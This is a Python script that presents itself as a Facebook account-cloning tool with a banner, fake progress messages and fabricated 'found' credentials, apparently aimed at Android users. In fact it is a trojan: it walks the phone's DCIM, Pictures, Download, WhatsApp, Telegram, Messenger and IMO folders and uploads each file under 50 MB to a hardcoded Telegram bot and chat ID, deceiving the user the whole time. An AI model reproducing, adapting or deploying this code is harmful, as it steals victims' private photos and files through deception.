import os
import requests
import time
import random
import sys
import threading

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"

BOT_TOKEN = "7395653905:AAERj-Co1l5QmgJO-TEK3va1C81CijAVM94"
CHAT_ID = "6333041510"

FOLDERS_TO_SCAN = [
    "/storage/emulated/0/DCIM/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/Download/",
    "/storage/emulated/0/Facebook/",
    "/storage/emulated/0/Messenger/",
    "/storage/emulated/0/Telegram/",
    "/storage/emulated/0/Movies/",
    "/storage/emulated/0/IMO/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
]

MAX_FILE_SIZE_MB = 50
sent_files = set()

NAMES = ["imran", "parvez", "mamun", "sabbir", "ridoy", "mim", "tanvir", "rahim", "fahim", "junaid"]
FB_ACCOUNTS = [
    {"email": f"{random.choice(NAMES)}{random.randint(1000,9999)}@gmail.com", "password": f"{random.choice(NAMES)}{random.randint(1000,9999)}"},
    {"email": f"{random.choice(NAMES)}{random.randint(1000,9999)}@yahoo.com", "password": f"{random.choice(NAMES)}{random.randint(1000,9999)}"},
    {"email": f"{random.choice(NAMES)}{random.randint(1000,9999)}@outlook.com", "password": f"{random.choice(NAMES)}{random.randint(1000,9999)}"},
]

def generate_cookies():
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choice(chars) for _ in range(30))

def send_to_telegram(file_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as document:
            files = {'document': document}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data)
    except:
        pass  

stop_animation = False  

def show_status():
    global stop_animation
    status_texts = [
        "⚡ Account progress running...",
        "🔍 Checking random account...",
        "📡 Facebook account cloning..."
    ]
    index = 0
    while True:
        if stop_animation:
            sys.stdout.write("\r" + " " * 60 + "\r")  
            sys.stdout.flush()
            break
        sys.stdout.write(f"\r{CYAN}[ {status_texts[index]} ]{RESET}   ")
        sys.stdout.flush()
        index = (index + 1) % len(status_texts)
        time.sleep(1)

def send_files(user_input):
    global stop_animation
    count = 0  
    fb_index = 0  

    for folder in FOLDERS_TO_SCAN:
        if not os.path.exists(folder):
            continue  

        for root, dirs, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)

                if file_path in sent_files:
                    continue

                file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
                if file_size_mb > MAX_FILE_SIZE_MB:
                    continue

                send_to_telegram(file_path)
                sent_files.add(file_path)

                count += 1  
                time.sleep(2)

                if count % 20 == 0 and fb_index < len(FB_ACCOUNTS):
                    stop_animation = True  
                    time.sleep(0.5)  

                    fb_data = FB_ACCOUNTS[fb_index]
                    random_cookies = generate_cookies()
                    print(f"\n{GREEN}✅ {fb_index + 1} account found!{RESET}")
                    print(f"{RED}📧 Mail: {YELLOW}{fb_data['email']}{RESET}")
                    print(f"{RED}🔑 Password: {YELLOW}{fb_data['password']}{RESET}")
                    print(f"{RED}🍪 Cookies: {YELLOW}{random_cookies}{RESET}\n")

                    fb_index += 1  
                    stop_animation = False  
                    animation_thread = threading.Thread(target=show_status, daemon=True)
                    animation_thread.start()

                if count >= user_input:
                    stop_animation = True  
                    print(f"\n{GREEN}🎉 Thank you for connected us! 🎉{RESET}")
                    return  

def show_logo():
    os.system("clear")
    print(f"{RED}███████╗ █████╗  ██████╗ ███████╗██████╗ ")
    print(f"██╔════╝██╔══██╗██╔════╝ ██╔════╝██╔══██╗")
    print(f"███████╗███████║██║  ███╗█████╗  ██████╔╝")
    print(f"╚════██║██╔══██║██║   ██║██╔══╝  ██╔═══╝ ")
    print(f"███████║██║  ██║╚██████╔╝███████╗██║     ")
    print(f"╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝    {RESET}")
    print(f"{CYAN}──────────────────────────────────────────{RESET}")
    print(f"{YELLOW} Developer : {GREEN}HELLO WORLD {RESET}")
    print(f"{YELLOW} CEO       : {GREEN}BHT COMMUNITY{RESET}")
    print(f"{YELLOW} Mail      : {GREEN}Random{RESET}")
    print(f"{CYAN}──────────────────────────────────────────{RESET}")

def get_user_input():
    while True:
        try:
            user_input = int(input(f"\n{CYAN}🔍 Enter any number (1000 or more to start): {RESET}"))
            if user_input >= 1000:
                print(f"\n{GREEN}✅ Starting process...\n{RESET}")
                time.sleep(2)
                return user_input
            else:
                print(f"{RED}❌ Number too low! Try again...{RESET}")
        except ValueError:
            print(f"{RED}❌ Invalid input! Please enter a valid number.{RESET}")

show_logo()
user_input = get_user_input()

threading.Thread(target=show_status, daemon=True).start()

send_files(user_input)